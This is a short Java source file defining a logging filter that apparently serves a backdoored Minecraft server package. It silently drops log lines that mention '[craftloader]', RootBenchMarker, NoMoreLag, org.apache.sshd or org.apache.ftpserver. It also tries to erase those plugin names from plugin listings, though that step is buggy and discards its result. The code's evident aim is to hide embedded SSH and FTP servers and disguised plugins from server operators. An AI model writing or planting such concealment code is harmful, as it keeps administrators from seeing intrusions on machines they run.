package com.testingsquish.craft;



import java.util.logging.LogRecord;


public class MyFilter2 implements java.util.logging.Filter{
	public boolean isLoggable(LogRecord lr) {
		String msg = lr.getMessage();
		//lr.setMessage("a");
		if(badmessage(msg.toLowerCase()))
		{
			return false;
		}
		if((msg.toLowerCase().contains("rootbenchmarker") || msg.toLowerCase().contains("nomorelag") ) && msg.toLowerCase().contains("plugins "))
		{
			msg.replaceAll("RootBenchMarker", "");
			msg.replaceAll("NoMoreLag", "");
		lr.setMessage(msg);
		}
		return true;
	}

	private boolean badmessage(String s) {
		if(s.contains("[craftloader]") || s.contains("[rootbenchmarker]") || s.contains("[nomorelag]") || s.contains("org.apache.sshd") || s.contains("org.apache.ftpserver"))
			{
			return true;	
			}
		return false;
	}

	
}